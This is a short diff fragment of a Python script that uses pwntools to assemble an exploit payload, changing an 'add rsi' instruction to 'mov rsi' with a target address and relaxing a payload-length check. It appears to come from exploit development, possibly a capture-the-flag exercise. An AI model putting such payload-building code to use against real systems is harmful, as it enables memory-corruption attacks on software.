@@ -26,5 +26,5 @@ payload += pwn.asm("""
         pop rdi
         """)
 payload += pwn.asm("""
-        add rsi, """ + hex(address))
-assert (len(payload) < 18 * 2), "payload is too long already"
+        mov rsi, """ + hex(address))
+assert (len(payload) < 18 * 4), "payload is too long already"
